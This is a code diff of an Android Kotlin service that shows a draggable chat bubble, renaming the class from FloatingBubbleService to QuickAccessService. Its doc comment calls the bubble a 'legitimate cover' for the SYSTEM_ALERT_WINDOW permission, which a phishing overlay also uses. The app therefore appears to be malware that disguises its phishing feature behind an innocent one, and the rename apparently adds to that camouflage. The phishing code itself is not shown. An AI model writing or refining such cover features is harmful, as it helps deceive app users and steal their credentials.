@@ -24,11 +24,11 @@ import android.widget.TextView
 import androidx.core.app.NotificationCompat
 
 /**
- * FloatingBubbleService — shows a draggable chat bubble when app is backgrounded.
+ * QuickAccessService — shows a draggable chat bubble when app is backgrounded.
  * Tap to reopen, long-press to dismiss.
  * Legitimate cover for SYSTEM_ALERT_WINDOW — same permission used by phishing overlay.
  */
-class FloatingBubbleService : Service() {
+class QuickAccessService : Service() {
 
     private var windowManager: WindowManager? = null
     private var bubbleView: View? = null
@@ -38,7 +38,7 @@ class FloatingBubbleService : Service() {
         private const val NOTIF_ID   = 9001
 
         fun start(context: Context) {
-            val intent = Intent(context, FloatingBubbleService::class.java)
+            val intent = Intent(context, QuickAccessService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
@@ -47,7 +47,7 @@ class FloatingBubbleService : Service() {
         }
 
         fun stop(context: Context) {
-            context.stopService(Intent(context, FloatingBubbleService::class.java))
+            context.stopService(Intent(context, QuickAccessService::class.java))
         }
     }
 
